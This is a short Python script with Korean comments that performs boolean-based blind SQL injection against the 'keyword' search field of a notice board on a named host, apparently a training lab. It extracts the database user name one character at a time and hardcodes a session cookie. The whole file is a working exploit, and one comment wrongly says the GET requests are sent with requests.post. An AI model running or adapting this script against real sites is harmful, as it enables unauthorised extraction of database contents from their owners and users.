import requests

url = 'http://elms2.skinfosec.co.kr:8083/exam5/notice.php'
# Cookie 값은 로그인 후 변경 필요
cookie = {'PHPSESSID': 'e0e2ffe3f6cc6753f73e266bed52c9d9'}

def find_target():

    find_value = ""

    for i in range(5):
        
        for ascii in range(48, 122):
            param = {"keyword": "aaa' AND ASCII(substr(user(),{},1)) = {} and '%1%'='%1".format(i+1, ascii), "pageIndex": "1", "board_id": "", "sorting": "", "sortingAd": "DESC", "searchType": "all"}
            print(param)
            # GET방식으로 전송하므로 requests.post로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("user의 값은: ",chr(ascii))
                find_value += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("User의 이름은:", find_value, "입니다.")

find_target()
             

        